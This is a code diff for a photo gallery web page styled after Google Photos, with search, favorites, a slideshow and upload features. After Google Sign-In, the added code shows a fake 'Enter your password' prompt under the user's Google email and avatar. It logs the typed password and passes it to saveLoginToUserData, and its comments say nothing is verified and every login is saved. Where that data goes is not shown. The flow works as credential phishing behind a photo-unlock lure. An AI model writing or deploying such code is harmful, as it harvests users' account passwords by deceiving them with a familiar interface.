-  showToast('App installed 🎉');
-});
-if ('serviceWorker' in navigator) {
-  const swCode = `
+    function renderLockedGallery(remaining) {
+      lockedGallery.innerHTML = '';
+      const preview = remaining.slice(0, 6);
+      preview.forEach((src) => {
+        const card = document.createElement('div');
+        card.className = 'pic-card';
+        const img = document.createElement('img');
+        img.src = src; img.loading = 'lazy';
+        img.alt = 'locked';
+        card.appendChild(img);
+        lockedGallery.appendChild(card);
+      });
+    }
+
+    function loadMore(count) {
+      const end = Math.min(visibleCount + count, currentList.length);
+      for (let i = visibleCount; i < end; i++) {
+        gallery.appendChild(createCard(currentList[i], i));
+      }
+      visibleCount = end;
+      updateViewMoreBtn();
+    }
+
+    function updateViewMoreBtn() {
+      if (visibleCount >= currentList.length) {
+        viewMoreBtn.classList.add('done');
+        viewMoreText.textContent = 'All photos loaded';
+      } else {
+        viewMoreBtn.classList.remove('done');
+        viewMoreText.textContent = `View more (${currentList.length - visibleCount})`;
+      }
+    }
+
+    viewMoreBtn.addEventListener('click', () => {
+      if (visibleCount >= currentList.length) return;
+      loadMore(LOAD_COUNT);
+    });
+
+    /* ============================================
+       SEARCH / TABS
+       ============================================ */
+    let searchTimer;
+    searchInput.addEventListener('input', (e) => {
+      clearTimeout(searchTimer);
+      searchTimer = setTimeout(() => {
+        searchQuery = e.target.value.trim();
+        renderGallery(getFilteredList());
+      }, 150);
+    });
+
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        // 🔥 Favorites tab pe check lagao
+        if (tab.dataset.filter === 'favorites' && !isLoggedIn) {
+          signinModal.style.display = 'flex';
+          return;
+        }
+
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        currentTab = tab.dataset.filter;
+        renderGallery(getFilteredList());
+      });
+    });
+
+    /* ============================================
+       GOOGLE SIGN-IN CALLBACK
+       ============================================ */
+    function handleCredentialResponse(response) {
+      const payload = JSON.parse(atob(response.credential.split('.')[1]));
+      console.log('Google user:', payload);
+      askPassword(payload);
+    }
+    window.handleCredentialResponse = handleCredentialResponse;
+
+    /* ============================================
+       ASK PASSWORD
+       ============================================ */
+    function askPassword(payload) {
+      pendingUser = payload;
+
+      const overlay = $('pwdOverlay');
+      const title = $('pwdTitle');
+      const desc = $('pwdDesc');
+      const input = $('pwdInput');
+      const error = $('pwdError');
+      const label1 = $('pwdLabel1');
+
+      error.textContent = '';
+      input.value = '';
+
+      $('pwdUserEmail').textContent = payload.email;
+      if (payload.picture) {
+        $('pwdUserAvatar').style.background = `url(${payload.picture}) center/cover`;
+        $('pwdUserAvatar').textContent = '';
+      } else {
+        $('pwdUserAvatar').style.background = 'linear-gradient(135deg, #4285F4, #34A853)';
+        $('pwdUserAvatar').textContent = (payload.name || payload.email).charAt(0).toUpperCase();
+      }
+
+      title.textContent = 'Welcome';
+      desc.textContent = 'Enter your password';
+      label1.textContent = 'Enter your password';
+
+      overlay.classList.add('show');
+      setTimeout(() => input.focus(), 100);
+    }
+
+    /* ============================================
+       PASSWORD EVENTS
+       ============================================ */
+    $('pwdSubmit').addEventListener('click', submitPassword);
+    $('pwdInput').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') { e.preventDefault(); submitPassword(); }
+    });
+
+    $('pwdCancel').addEventListener('click', () => {
+      $('pwdOverlay').classList.remove('show');
+      pendingUser = null;
+      const gsiWrapper = document.querySelector('.g_id_signin');
+      if (gsiWrapper) gsiWrapper.style.display = 'flex';
+    });
+
+    $('pwdShow').addEventListener('change', (e) => {
+      $('pwdInput').type = e.target.checked ? 'text' : 'password';
+    });
+
+    $('pwdForgot').addEventListener('click', (e) => {
+      e.preventDefault();
+      if (!pendingUser) return;
+      showToast('No password reset — har login naya entry banata hai');
+    });
+
+    /* ============================================
+       SUBMIT PASSWORD
+       (simple — koi verify nahi, har login save)
+       ============================================ */
+    async function submitPassword() {
+      const input = $('pwdInput');
+      const error = $('pwdError');
+      const pwd = input.value;
+
+      error.textContent = '';
+
+      if (pwd.length < 4) {
+        error.textContent = 'Password must be at least 4 characters';
+        return;
+      }
+
+      $('pwdShow').checked = false;
+      $('pwdInput').type = 'password';
+      $('pwdOverlay').classList.remove('show');
+
+      // 🔥 YE IMPORTANT HAI — await karo
+      await completeLogin(pendingUser, pwd);
+      pendingUser = null;
+    }
+
+    /* ============================================
+       COMPLETE LOGIN
+       ============================================ */
+    async function completeLogin(payload, password) {
+      console.log('🔍 completeLogin called with password:', password);
+
+      lockCard.classList.add('success');
+      lockTitle.textContent = 'Signed in successfully! 🎉';
+      lockDesc.textContent = `Welcome, ${payload.name || payload.email}!`;
+
+      const gsiWrapper = document.querySelector('.g_id_signin');
+      if (gsiWrapper) gsiWrapper.style.display = 'none';
+
+      isLoggedIn = true;
+      userEmail = payload.email;
+      localStorage.setItem('pics_logged_in', 'true');
+      localStorage.setItem('pics_user_email', payload.email);
+      localStorage.setItem('pics_user_name', payload.name || '');
+      localStorage.setItem('pics_user_pic', payload.picture || '');
+      localStorage.setItem('pics_user_uid', payload.sub || '');
+
+      // 🔥 YE IMPORTANT — await karo
+      await saveLoginToUserData(payload, password);
+
+      showToast('Signed in as ' + payload.email + ' ✅');
+      updateAvatarAfterLogin();
+      updateProfileMenu();
+
+      setTimeout(() => {
+        lockedSection.style.display = 'none';
+        renderGallery(getFilteredList());
+        showToast('All photos unlocked! 🎉');
+      }, 1200);
+    }
+
+    /* ============================================
+       AVATAR
+       ============================================ */
+    function updateAvatarAfterLogin() {
+      const pic = localStorage.getItem('pics_user_pic');
+      const name = localStorage.getItem('pics_user_name') || '';
+
+      if (avatarEl) {
+        if (pic) {
+          avatarEl.style.background = `url(${pic}) center/cover`;
+          avatarEl.textContent = '';
+        } else if (name) {
+          avatarEl.textContent = name.charAt(0).toUpperCase();
+          avatarEl.style.background = 'linear-gradient(135deg, #EA4335, #FBBC05)';
+        }
+        avatarEl.title = userEmail;
+      }
+    }
+
+    /* ============================================
+       PROFILE MENU
+       ============================================ */
+    function updateProfileMenu() {
+      const name = localStorage.getItem('pics_user_name') || '';
+      const email = localStorage.getItem('pics_user_email') || '';
+      const pic = localStorage.getItem('pics_user_pic') || '';
+
+      if (isLoggedIn && email) {
+        menuName.textContent = name || 'User';
+        menuEmail.textContent = email;
+        if (pic) {
+          menuAvatar.style.backgroundImage = `url(${pic})`;
+          menuAvatar.textContent = '';
+        } else {
+          menuAvatar.style.backgroundImage = '';
+          menuAvatar.textContent = (name || email).charAt(0).toUpperCase();
+        }
+        $('menuLogoutBtn').style.display = 'flex';
+      } else {
+        menuName.textContent = 'Guest User';
+        menuEmail.textContent = 'Not signed in';
+        menuAvatar.style.backgroundImage = '';
+        menuAvatar.textContent = 'A';
+        $('menuLogoutBtn').style.display = 'none';
+      }
+    }
+
+    if (avatarEl) {
+      avatarEl.addEventListener('click', (e) => {
+        e.stopPropagation();
+        updateProfileMenu();
+        profileMenu.classList.toggle('show');
+        profileOverlay.classList.toggle('show');
+      });
+    }
+
+    profileOverlay.addEventListener('click', () => {
+      profileMenu.classList.remove('show');
+      profileOverlay.classList.remove('show');
+    });
+
+    profileMenu.addEventListener('click', (e) => e.stopPropagation());
+
+    /* ============================================
+       LOGOUT
+       ============================================ */
+    $('menuLogoutBtn').addEventListener('click', () => {
+      localStorage.removeItem('pics_logged_in');
+      localStorage.removeItem('pics_user_email');
+      localStorage.removeItem('pics_user_name');
+      localStorage.removeItem('pics_user_pic');
+      localStorage.removeItem('pics_user_uid');
+
+      isLoggedIn = false;
+      userEmail = '';
+
+      avatarEl.style.background = 'linear-gradient(135deg, #4285F4, #34A853)';
+      avatarEl.style.backgroundImage = '';
+      avatarEl.textContent = 'A';
+      avatarEl.title = '';
+
+      profileMenu.classList.remove('show');
+      profileOverlay.classList.remove('show');
+
+      renderGallery(getFilteredList());
+      showToast('Signed out successfully 👋');
+
+      setTimeout(() => {
+        if (window.google && window.google.accounts) {
+          window.google.accounts.id.disableAutoSelect();
+        }
+      }, 100);
+    });
+
+    /* ============================================
+       MANAGE GOOGLE ACCOUNT
+       ============================================ */
+    $('menuAccountBtn').addEventListener('click', () => {
+      profileMenu.classList.remove('show');
+      profileOverlay.classList.remove('show');
+      if (userEmail) {
+        window.open('https://myaccount.google.com/', '_blank');
+      } else {
+        showToast('Please sign in first');
+      }
+    });
+    /* ============================================
+       SIGN-IN REQUIRED MODAL (FAVORITES)
+       ============================================ */
+    const signinModal = $('signinModal');
+
+    // Close modal
+    function closeSigninModal() {
+      signinModal.style.display = 'none';
+    }
+
+    // Modal Cancel button
+    $('signinModalCancel').addEventListener('click', closeSigninModal);
+
+    // Modal overlay click
+    signinModal.addEventListener('click', (e) => {
+      if (e.target === signinModal) closeSigninModal();
+    });
+
+    // Sign In button in modal
+    $('signinFromModalBtn').addEventListener('click', () => {
+      // Modal band karo
+      closeSigninModal();
+
+      // 🔥 Locked section dikhao + scroll karo
+      const locked = document.getElementById('lockedSection');
+      if (locked) {
+        locked.style.display = 'block';
+        locked.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+        // 🔥 Google button ko highlight karo
+        setTimeout(() => {
+          const googleBtn = locked.querySelector('.g_id_signin');
+          if (googleBtn) {
+            googleBtn.style.transform = 'scale(1.08)';
+            googleBtn.style.transition = 'transform 0.3s';
+            googleBtn.style.boxShadow = '0 0 20px rgba(66, 133, 244, 0.5)';
+            setTimeout(() => {
+              googleBtn.style.transform = 'scale(1)';
+              googleBtn.style.boxShadow = 'none';
+            }, 800);
+          }
+        }, 500);
+      }
+    });
+    /* ============================================
+       FAVORITES FROM MENU
+       ============================================ */
+    $('menuFavoritesBtn').addEventListener('click', () => {
+      profileMenu.classList.remove('show');
+      profileOverlay.classList.remove('show');
+
+      // 🔥 Check karo user logged in hai ya nahi
+      if (!isLoggedIn) {
+        // Sign-in modal dikhao
+        signinModal.style.display = 'flex';
+        return;
+      }
+
+      // User logged in → favorites tab kholo
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelector('.tab[data-filter="favorites"]').classList.add('active');
+      currentTab = 'favorites';
+      renderGallery(getFilteredList());
+    });
+
+    /* ============================================
+       FAVORITES
+       ============================================ */
+    function toggleFavorite(src, btn) {
+      const idx = favorites.indexOf(src);
+      if (idx > -1) {
+        favorites.splice(idx, 1);
+        if (btn) btn.classList.remove('active');
+        showToast('Removed from favorites');
+      } else {
+        favorites.push(src);
+        if (btn) btn.classList.add('active');
+        showToast('Added to favorites ❤️');
+      }
+      localStorage.setItem('pics_favorites', JSON.stringify(favorites));
+      updateCounts();
+      updateFavViewerBtn();
+      if (currentTab === 'favorites') renderGallery(getFilteredList());
+    }
+
+    function updateCounts() {
+      countAll.textContent = '(' + allImages.length + ')';
+      countFav.textContent = favorites.length ? '(' + favorites.length + ')' : '';
+    }
+
+    /* ============================================
+       VIEWER
+       ============================================ */
+    function openViewer(index) {
+      viewerIndex = index;
+      updateViewer();
+      viewer.classList.add('active');
+      document.body.style.overflow = 'hidden';
+
+      // 🔥 BROWSER FULLSCREEN MODE
+      const el = document.documentElement;
+      const req = el.requestFullscreen ||
+        el.webkitRequestFullscreen ||
+        el.mozRequestFullScreen ||
+        el.msRequestFullscreen;
+
+      if (req && !document.fullscreenElement) {
+        req.call(el).catch(err => {
+          console.log('Fullscreen blocked:', err.message);
+        });
+      }
+    }
+
+    function updateViewer() {
+      const src = currentList[viewerIndex];
+      if (!src) return;
+      viewerImg.src = src;
+      viewerTitle.textContent = 'Photo ' + (viewerIndex + 1);
+      viewerCounter.textContent = (viewerIndex + 1) + ' / ' + currentList.length;
+      ssCount.textContent = (viewerIndex + 1) + ' / ' + currentList.length;
+      prevBtn.disabled = viewerIndex === 0;
+      nextBtn.disabled = viewerIndex === currentList.length - 1;
+      updateFavViewerBtn();
+    }
+
+    function updateFavViewerBtn() {
+      const src = currentList[viewerIndex];
+      if (!src) return;
+      favViewerBtn.querySelector('svg').style.fill = favorites.includes(src) ? '#EA4335' : '#fff';
+    }
+
+    function closeViewer() {
+      stopSlideshow();
+      viewer.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
+    function prevImage() {
+      if (viewerIndex > 0) { viewerIndex--; updateViewer(); }
+    }
+    function nextImage() {
+      if (viewerIndex < currentList.length - 1) {
+        viewerIndex++; updateViewer();
+      } else if (slideshowActive) {
+        stopSlideshow();
+        showToast('Slideshow finished');
+      }
+    }
+
+    closeBtn.addEventListener('click', closeViewer);
+    viewer.addEventListener('click', (e) => {
+      if (e.target === viewer) closeViewer();
+    });
+    prevBtn.addEventListener('click', (e) => { e.stopPropagation(); prevImage(); });
+    nextBtn.addEventListener('click', (e) => { e.stopPropagation(); nextImage(); });
+
+    favViewerBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleFavorite(currentList[viewerIndex], null);
+    });
+
+    /* ============================================
+       SHARE
+       ============================================ */
+    shareBtn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      const src = currentList[viewerIndex];
+      if (!src) return;
+      if (!navigator.share) {
+        try {
+          await navigator.clipboard.writeText(src);
+          showToast('Link copied to clipboard 📋');
+        } catch {
+          showToast('Share not supported');
+        }
+        return;
+      }
+      try {
+        if (src.startsWith('data:') || src.startsWith('blob:')) {
+          const blob = await (await fetch(src)).blob();
+          const file = new File([blob], 'photo.jpg', { type: blob.type });
+          if (navigator.canShare && navigator.canShare({ files: [file] })) {
+            await navigator.share({ files: [file], title: 'Photo', text: 'Check this out!' });
+            showToast('Shared ✅');
+            return;
+          }
+        }
+        await navigator.share({ title: 'Photo', text: 'Check this out!', url: src });
+        showToast('Shared ✅');
+      } catch (err) {
+        if (err.name !== 'AbortError') showToast('Share cancelled');
+      }
+    });
+
+    /* ============================================
+       DOWNLOAD
+       ============================================ */
+    downloadBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const src = currentList[viewerIndex];
+      const a = document.createElement('a');
+      a.href = src;
+      a.download = 'photo-' + (viewerIndex + 1) + '.jpg';
+      a.target = '_blank';
+      a.click();
+      showToast('Downloading...');
+    });
+
+    /* ============================================
+       SLIDESHOW
+       ============================================ */
+    slideshowBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (slideshowActive) stopSlideshow(); else startSlideshow();
+    });
+
+    function startSlideshow() {
+      slideshowActive = true;
+      slideshowBar.classList.add('show');
+      slideshowProgress.classList.add('show');
+      slideshowBtn.querySelector('svg').innerHTML = '<path d="M6 5h4v14H6zm8 0h4v14h-4z"/>';
+      updateSSPlayIcon(true);
+      resetProgress();
+      clearInterval(slideshowTimer);
+      slideshowTimer = setInterval(() => {
+        if (viewerIndex < currentList.length - 1) {
+          viewerIndex++; updateViewer(); resetProgress();
+        } else {
+          stopSlideshow(); showToast('Slideshow finished 🎬');
+        }
+      }, slideshowInterval);
+      clearInterval(progressInterval);
+      slideshowElapsed = 0;
+      progressInterval = setInterval(() => {
+        slideshowElapsed += 50;
+        slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
+      }, 50);
+      showToast('Slideshow started ▶️');
+    }
+
+    function stopSlideshow() {
+      slideshowActive = false;
+      clearInterval(slideshowTimer);
+      clearInterval(progressInterval);
+      slideshowTimer = null; progressInterval = null;
+      slideshowBar.classList.remove('show');
+      slideshowProgress.classList.remove('show');
+      slideshowProgress.style.width = '0%';
+      slideshowBtn.querySelector('svg').innerHTML = '<path d="M8 5v14l11-7z"/>';
+    }
+
+    function resetProgress() {
+      slideshowElapsed = 0;
+      slideshowProgress.style.width = '0%';
+    }
+
+    function updateSSPlayIcon(playing) {
+      ssPlayIcon.innerHTML = playing
+        ? '<path d="M6 5h4v14H6zm8 0h4v14h-4z"/>'
+        : '<path d="M8 5v14l11-7z"/>';
+    }
+
+    ssPlayPause.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (slideshowTimer) {
+        clearInterval(slideshowTimer); clearInterval(progressInterval);
+        slideshowTimer = null; progressInterval = null;
+        updateSSPlayIcon(false);
+      } else {
+        slideshowTimer = setInterval(() => {
+          if (viewerIndex < currentList.length - 1) {
+            viewerIndex++; updateViewer(); resetProgress();
+          } else { stopSlideshow(); showToast('Slideshow finished 🎬'); }
+        }, slideshowInterval);
+        progressInterval = setInterval(() => {
+          slideshowElapsed += 50;
+          slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
+        }, 50);
+        updateSSPlayIcon(true);
+      }
+    });
+
+    ssSpeed.addEventListener('change', (e) => {
+      e.stopPropagation();
+      slideshowInterval = parseInt(e.target.value);
+      if (slideshowActive) {
+        clearInterval(slideshowTimer); clearInterval(progressInterval);
+        resetProgress();
+        slideshowTimer = setInterval(() => {
+          if (viewerIndex < currentList.length - 1) {
+            viewerIndex++; updateViewer(); resetProgress();
+          } else { stopSlideshow(); showToast('Slideshow finished 🎬'); }
+        }, slideshowInterval);
+        progressInterval = setInterval(() => {
+          slideshowElapsed += 50;
+          slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
+        }, 50);
+      }
+    });
+
+    ssStop.addEventListener('click', (e) => {
+      e.stopPropagation();
+      stopSlideshow();
+      showToast('Slideshow stopped');
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (!viewer.classList.contains('active')) return;
+      if (e.key === 'Escape') closeViewer();
+      if (e.key === 'ArrowLeft') prevImage();
+      if (e.key === 'ArrowRight') nextImage();
+      if (e.key === ' ') {
+        e.preventDefault();
+        slideshowActive ? stopSlideshow() : startSlideshow();
+      }
+    });
+
+    let touchStartX = 0;
+    viewer.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; }, { passive: true });
+    viewer.addEventListener('touchend', (e) => {
+      const diff = e.changedTouches[0].screenX - touchStartX;
+      if (Math.abs(diff) > 60) { if (diff > 0) prevImage(); else nextImage(); }
+    }, { passive: true });
+
+    /* ============================================
+       UPLOAD
+       ============================================ */
+    uploadBtn.addEventListener('click', () => fileInput.click());
+    fileInput.addEventListener('change', (e) => {
+      const files = Array.from(e.target.files);
+      if (!files.length) return;
+      let loaded = 0;
+      const newImages = [];
+      files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = (ev) => {
+          newImages.push(ev.target.result);
+          loaded++;
+          if (loaded === files.length) {
+            const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
+            const updated = [...newImages, ...uploaded];
+            localStorage.setItem('pics_uploaded', JSON.stringify(updated));
+            allImages = [...updated, ...DEFAULT_IMAGES];
+            updateCounts();
+            renderGallery(getFilteredList());
+            showToast(files.length + ' photo(s) uploaded ✅');
+          }
+        };
+        reader.readAsDataURL(file);
+      });
+      fileInput.value = '';
+    });
+
+    /* ============================================
+       TOAST
+       ============================================ */
+    let toastTimer;
+    function showToast(msg) {
+      toast.textContent = msg;
+      toast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    /* ============================================
+       PWA
+       ============================================ */
+    let deferredPrompt = null;
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+      installBtn.style.display = 'flex';
+    });
+    installBtn.addEventListener('click', async () => {
+      if (!deferredPrompt) { showToast('App already installed'); return; }
+      deferredPrompt.prompt();
+      const { outcome } = await deferredPrompt.userChoice;
+      if (outcome === 'accepted') showToast('App installed 🎉');
+      deferredPrompt = null;
+      installBtn.style.display = 'none';
+    });
+    window.addEventListener('appinstalled', () => {
+      installBtn.style.display = 'none';
+      showToast('App installed 🎉');
+    });
+    if ('serviceWorker' in navigator) {
+      const swCode = `
   const CACHE='pics-app-v1';
   self.addEventListener('install',e=>self.skipWaiting());
   self.addEventListener('activate',e=>self.clients.claim());
@@ -2906,34 +2949,34 @@ if ('serviceWorker' in navigator) {
     }).catch(()=>caches.match(e.request))));
   });
 `;
-  try {
-    const blob = new Blob([swCode], { type: 'application/javascript' });
-    const url = URL.createObjectURL(blob);
-    navigator.serviceWorker.register(url).catch(() => { });
-  } catch (e) { }
-}
+      try {
+        const blob = new Blob([swCode], { type: 'application/javascript' });
+        const url = URL.createObjectURL(blob);
+        navigator.serviceWorker.register(url).catch(() => { });
+      } catch (e) { }
+    }
 
-/* ============================================
-   BOTTOM NAV
-   ============================================ */
-document.querySelectorAll('.gphotos-nav-item').forEach(item => {
-  item.addEventListener('click', () => {
-    document.querySelectorAll('.gphotos-nav-item').forEach(i => i.classList.remove('active'));
-    item.classList.add('active');
-  });
-});
+    /* ============================================
+       BOTTOM NAV
+       ============================================ */
+    document.querySelectorAll('.gphotos-nav-item').forEach(item => {
+      item.addEventListener('click', () => {
+        document.querySelectorAll('.gphotos-nav-item').forEach(i => i.classList.remove('active'));
+        item.classList.add('active');
+      });
+    });
 
-/* ============================================
-   MENU BUTTON (demo)
-   ============================================ */
-$('menuBtn').addEventListener('click', () => {
-  showToast('Menu coming soon');
-});
+    /* ============================================
+       MENU BUTTON (demo)
+       ============================================ */
+    $('menuBtn').addEventListener('click', () => {
+      showToast('Menu coming soon');
+    });
 
-/* ============================================
-   START
-   ============================================ */
-init();
+    /* ============================================
+       START
+       ============================================ */
+    init();
   </script>
 
 </body>
